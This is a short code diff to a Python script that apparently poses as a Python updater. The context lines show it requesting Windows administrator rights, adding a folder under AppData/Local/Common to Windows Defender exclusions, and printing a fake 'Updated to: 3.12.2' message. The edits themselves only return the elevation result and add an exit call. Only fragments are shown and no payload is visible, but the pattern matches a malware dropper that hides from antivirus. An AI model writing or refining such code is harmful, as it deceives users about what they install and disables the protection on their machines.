@@ -18,7 +18,7 @@ class Main:
         return install_input.strip().lower() in ['y', '']
 
     def request_admin_privileges(self):
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) #Windows specific command to request admin privileges
+        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) #Windows specific command to request admin privileges
 
     def add_folder_to_windows_defender_exclusions(self):
         folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
@@ -44,6 +44,7 @@ class Main:
         print("Updated to: 3.12.2")
         print("Restart may be required.")
         time.sleep(2)
+        exit(0)
 
 if __name__ == "__main__":
     self = Main()
